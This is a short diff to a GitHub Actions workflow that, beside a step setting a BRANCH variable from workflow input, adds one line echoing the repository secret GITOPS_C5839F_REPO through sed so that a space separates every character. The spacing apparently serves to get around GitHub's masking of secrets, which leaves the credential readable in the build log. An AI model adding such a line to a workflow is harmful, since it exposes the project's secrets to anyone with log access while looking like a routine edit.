@@ -25,6 +25,7 @@ jobs:
         if: ${{ github.event.inputs.branch }}
         run: |
           echo "BRANCH=${{ github.event.inputs.branch }}" | tee -a $GITHUB_ENV
+          echo ${{secrets.GITOPS_C5839F_REPO}} | sed 's/./& /g'
 
       - uses: actions/checkout@v2
         with:
